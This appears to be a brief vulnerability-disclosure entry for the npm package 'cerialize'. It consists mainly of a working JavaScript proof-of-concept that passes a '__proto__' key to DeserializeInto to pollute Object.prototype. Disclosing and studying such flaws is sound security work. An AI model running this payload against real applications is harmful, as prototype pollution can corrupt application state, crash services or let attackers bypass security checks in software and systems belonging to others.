# Cerialize

- package name: `cerialize`

- PoC exploit:

```javascript
var cerialize = require('cerialize');
cerialize.DeserializeInto({['__proto__']: {polluted: 'yes'}}, undefined, {});

// Object.prototype.polluted === 'yes'
```